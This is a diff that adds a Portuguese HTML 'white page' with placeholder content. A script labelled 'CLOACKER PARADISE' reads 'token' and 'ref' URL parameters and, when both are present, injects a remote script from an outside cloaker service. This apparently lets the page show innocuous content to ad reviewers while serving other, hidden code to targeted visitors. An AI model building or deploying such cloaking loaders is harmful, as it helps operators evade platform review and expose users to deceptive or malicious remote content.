@@ -1,1 +1,24 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Página Whaite</title>
 
+  <!-- CLOACKER PARADISE -->
+    <script>
+  const query = window.location.search;
+  const urlParams = new URLSearchParams(query);
+  const token = urlParams.get("token");
+  const ref = urlParams.get("ref");
+
+  if (token && ref) {
+    const s = document.createElement("script");
+    s.src = `https://paradisepags.com/clockerv2/load.php?token=${token}&ref=${ref}`;
+    document.head.appendChild(s);
+  }
+</script>
+</head>
+<body>
+  <h1>Conteúdo white aqui</h1>
+</body>
+</html>
